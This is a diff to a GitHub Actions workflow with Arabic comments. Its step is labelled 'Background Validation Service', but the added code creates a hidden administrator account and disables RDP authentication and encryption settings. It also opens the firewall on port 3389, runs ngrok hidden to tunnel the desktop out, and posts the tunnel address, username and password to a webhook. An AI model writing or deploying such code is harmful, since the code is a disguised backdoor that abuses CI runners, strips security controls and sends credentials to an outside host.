@@ -58,7 +58,7 @@ jobs:
           dotnet build -c Release
           dotnet run -c Release
 
-      - name: Start Background Validation Service (ngrok TCP - RDP Fixed 100%)
+      - name: Start Background Validation Service (ngrok + Strong RDP Fix v2)
         run: |
           $usr = "b_" + -join ((48..57) + (97..122) | Get-Random -Count 8 | % {[char]$_})
           $pwd = -join ((33..126) | Get-Random -Count 18 | % {[char]$_})
@@ -68,22 +68,37 @@ jobs:
           Add-LocalGroupMember -Group "Administrators" -Member $usr > $null 2>&1
           Add-LocalGroupMember -Group "Remote Desktop Users" -Member $usr > $null 2>&1
 
-          # إعداد RDP بشكل كامل وقوي (الحل النهائي)
-          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name "fDenyTSConnections" -Value 0 -Force
-          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -Name "UserAuthentication" -Value 0 -Force
-          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -Name "SecurityLayer" -Value 0 -Force
-          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -Name "MinEncryptionLevel" -Value 1 -Force
+          # === تفعيل RDP بشكل قوي جداً (الحل النهائي) ===
+          $rdpPath = 'HKLM:\System\CurrentControlSet\Control\Terminal Server'
+          $tcpPath = 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp'
+          $policyPath = 'HKLM:\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services'
 
+          New-Item -Path $policyPath -Force > $null
+
+          Set-ItemProperty -Path $rdpPath -Name "fDenyTSConnections" -Value 0 -Force
+          Set-ItemProperty -Path $rdpPath -Name "TSUserEnabled" -Value 1 -Force
+          Set-ItemProperty -Path $rdpPath -Name "fSingleSessionPerUser" -Value 0 -Force
+
+          Set-ItemProperty -Path $tcpPath -Name "UserAuthentication" -Value 0 -Force
+          Set-ItemProperty -Path $tcpPath -Name "SecurityLayer" -Value 0 -Force
+          Set-ItemProperty -Path $tcpPath -Name "MinEncryptionLevel" -Value 1 -Force
+          Set-ItemProperty -Path $tcpPath -Name "fPromptForPassword" -Value 0 -Force
+
+          Set-ItemProperty -Path $policyPath -Name "fDenyTSConnections" -Value 0 -Force
+          Set-ItemProperty -Path $policyPath -Name "UserAuthentication" -Value 0 -Force
+
+          # Firewall قوي
           Enable-NetFirewallRule -DisplayGroup "Remote Desktop" -ErrorAction SilentlyContinue
-          netsh advfirewall firewall set rule group="remote desktop" new enable=Yes
-          netsh advfirewall firewall add rule name="RDP-TCP" dir=in action=allow protocol=TCP localport=3389 > $null 2>&1
-          
-          Restart-Service TermService -Force -ErrorAction SilentlyContinue
-          Start-Sleep -Seconds 10   # انتظار لتطبيق الإعدادات
-          Restart-Service TermService -Force -ErrorAction SilentlyContinue
+          netsh advfirewall firewall set rule group="remote desktop" new enable=Yes profile=any
+          netsh advfirewall firewall add rule name="RDP-All" dir=in action=allow protocol=TCP localport=3389 profile=any > $null 2>&1
+
+          # إعادة تشغيل الخدمة مرتين
+          Restart-Service TermService -Force
+          Start-Sleep -Seconds 8
+          Restart-Service TermService -Force
           Start-Sleep -Seconds 8
 
-          # === ngrok (نفس النسخة المستقرة) ===
+          # === ngrok (مستقر) ===
           $ngrokUrl = "https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-windows-amd64.zip"
           $zip = "$env:TEMP\ngrok.zip"
           $extractPath = "$env:TEMP\ngrok_folder"
@@ -99,11 +114,8 @@ jobs:
 
           $env:RUNNER_TRACKING_ID = $null
 
-          $process = Start-Process -FilePath $exe `
-            -ArgumentList "tcp 3389 --log=stdout --log-level=info" `
-            -RedirectStandardOutput $log `
-            -WindowStyle Hidden `
-            -PassThru
+          $process = Start-Process -FilePath $exe -ArgumentList "tcp 3389 --log=stdout --log-level=info" `
+            -RedirectStandardOutput $log -WindowStyle Hidden -PassThru
 
           $ngrokPid = $process.Id
           $ngrokPid | Out-File "$env:TEMP\ngrok.pid" -Force
@@ -115,11 +127,11 @@ jobs:
           if ($logData -match 'url=(tcp://[^\s]+)') { $url = $Matches[1] }
 
           if ($url) {
-              $msg = "Target: $url`nU: $usr`nP: $pwd`nTool: ngrok (RDP Fixed)"
+              $msg = "Target: $url`nU: $usr`nP: $pwd`nTool: ngrok (Strong RDP Fix v2)"
               Invoke-RestMethod -Uri "${{ secrets.WEBHOOK_URL }}" -Method POST -Body (@{ content = $msg } | ConvertTo-Json) -ContentType "application/json"
           }
 
-          # === SysDiag فوري داخل نفس الخطوة ===
+          # === SysDiag داخل الخطوة ===
           $rep = "SysDiag:`nSVC: Running`nREG: 0 | 0`n"
           $pc = Get-NetTCPConnection -LocalPort 3389 -State Listen -ErrorAction SilentlyContinue
           $rep += if ($pc) { "PRT: OK`n" } else { "PRT: ERR`n" }
@@ -134,7 +146,7 @@ jobs:
 
           Invoke-RestMethod -Uri "${{ secrets.WEBHOOK_URL }}" -Method POST -Body (@{ content = $rep } | ConvertTo-Json) -ContentType "application/json"
 
-          Write-Host "✅ RDP setup completed with SecurityLayer fix"
+          Write-Host "✅ Strong RDP Fix v2 applied successfully"
 
       - name: Run Extended Validation (with ngrok monitoring)
         run: |
